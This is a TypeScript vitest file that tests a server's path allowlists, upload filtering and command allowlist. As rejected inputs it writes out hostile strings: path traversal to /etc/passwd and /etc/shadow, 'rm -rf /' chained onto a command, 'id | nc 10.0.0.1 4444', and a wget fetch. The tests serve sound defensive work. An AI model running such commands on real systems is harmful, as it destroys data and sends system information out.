import { describe, expect, it } from 'vitest';
import { AccError } from '../server/errors.ts';
import { isAllowlistedCommand } from '../server/security/commands.ts';
import {
  SOUNDS_ROOT,
  assertReadablePath,
  assertSafeUpload,
  assertSoundPath,
  assertWritablePath,
  isWithin,
  normalizeRemotePath,
} from '../server/security/paths.ts';

function expectCode(run: () => unknown, code: string): void {
  try {
    run();
  } catch (error) {
    expect(error).toBeInstanceOf(AccError);
    expect((error as AccError).code).toBe(code);
    return;
  }
  throw new Error(`Ожидалась ошибка ${code}`);
}

describe('normalizeRemotePath', () => {
  it('accepts absolute paths and collapses duplicate slashes', () => {
    expect(normalizeRemotePath('/data//opt/acc')).toBe('/data/opt/acc');
  });

  it('rejects traversal, relative paths, null bytes and root', () => {
    expectCode(() => normalizeRemotePath('/data/opt/../etc/passwd'), 'BAD_PATH');
    expectCode(() => normalizeRemotePath('data/opt'), 'BAD_PATH');
    expectCode(() => normalizeRemotePath('/data/opt/\0x'), 'BAD_PATH');
    expectCode(() => normalizeRemotePath('/'), 'BAD_PATH');
    expectCode(() => normalizeRemotePath(42), 'BAD_PATH');
  });
});

describe('path allowlists', () => {
  it('allows reads inside configured roots only', () => {
    expect(assertReadablePath('/data/opt/app.json')).toBe('/data/opt/app.json');
    expect(assertReadablePath(SOUNDS_ROOT)).toBe(SOUNDS_ROOT);
    expectCode(() => assertReadablePath('/etc/passwd'), 'PATH_NOT_ALLOWED');
    expectCode(() => assertReadablePath('/data/opt-evil/x'), 'PATH_NOT_ALLOWED');
  });

  it('restricts writes to /data/opt and /data/sounds', () => {
    expect(assertWritablePath('/data/sounds/alert.mp3')).toBe('/data/sounds/alert.mp3');
    expectCode(() => assertWritablePath(`${SOUNDS_ROOT}/alarm.ogg`), 'PATH_NOT_ALLOWED');
    expectCode(() => assertWritablePath('/data/opt/../../etc/shadow'), 'BAD_PATH');
  });

  it('requires sound replacements to be files inside the sounds root', () => {
    expect(assertSoundPath(`${SOUNDS_ROOT}/alarm.ogg`)).toBe(`${SOUNDS_ROOT}/alarm.ogg`);
    expectCode(() => assertSoundPath(SOUNDS_ROOT), 'PATH_NOT_ALLOWED');
    expectCode(() => assertSoundPath('/data/sounds/alarm.ogg'), 'PATH_NOT_ALLOWED');
  });

  it('matches root prefixes on segment boundaries', () => {
    expect(isWithin('/data/opt', '/data/opt')).toBe(true);
    expect(isWithin('/data/opt', '/data/opt/a')).toBe(true);
    expect(isWithin('/data/opt', '/data/optional')).toBe(false);
  });
});

describe('assertSafeUpload', () => {
  it('blocks dangerous extensions regardless of case', () => {
    expectCode(() => assertSafeUpload('tool.ELF', Buffer.from('hello')), 'FILE_TYPE_BLOCKED');
    expectCode(() => assertSafeUpload('package.apk', Buffer.from('hello')), 'FILE_TYPE_BLOCKED');
  });

  it('blocks executables by magic bytes even with an audio extension', () => {
    const elf = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01]);
    expectCode(() => assertSafeUpload('alarm.ogg', elf), 'FILE_TYPE_BLOCKED');
    const pe = Buffer.from([0x4d, 0x5a, 0x90, 0x00]);
    expectCode(() => assertSafeUpload('sound.mp3', pe), 'FILE_TYPE_BLOCKED');
  });

  it('allows ordinary audio payloads', () => {
    const ogg = Buffer.from('OggS....');
    expect(() => assertSafeUpload('alarm.ogg', ogg)).not.toThrow();
  });
});

describe('isAllowlistedCommand', () => {
  it('allows documented read-only commands', () => {
    for (const command of [
      'uname -a',
      'uptime',
      'df -h',
      'cat /proc/meminfo',
      'cat /sys/class/thermal/thermal_zone0/temp',
      'ls -la /data/opt',
      'bluetoothctl show',
      'q version',
      'dmesg',
    ]) {
      expect(isAllowlistedCommand(command), command).toBe(true);
    }
  });

  it('rejects shell metacharacters and chained commands', () => {
    for (const command of [
      'uptime; reboot',
      'cat /proc/meminfo && rm -rf /',
      'echo hi > /data/opt/x',
      'cat $(whoami)',
      'id | nc 10.0.0.1 4444',
      'uname -a\nreboot',
    ]) {
      expect(isAllowlistedCommand(command), command).toBe(false);
    }
  });

  it('rejects paths and binaries outside the allowlist', () => {
    for (const command of [
      'cat /etc/passwd',
      'rm -rf /data',
      'reboot',
      'wget http://example.com/x',
      'bluetoothctl scan on',
      'uname -z',
    ]) {
      expect(isAllowlistedCommand(command), command).toBe(false);
    }
  });

  it('rejects empty and oversized commands', () => {
    expect(isAllowlistedCommand('')).toBe(false);
    expect(isAllowlistedCommand(`uptime ${'x'.repeat(400)}`)).toBe(false);
  });
});
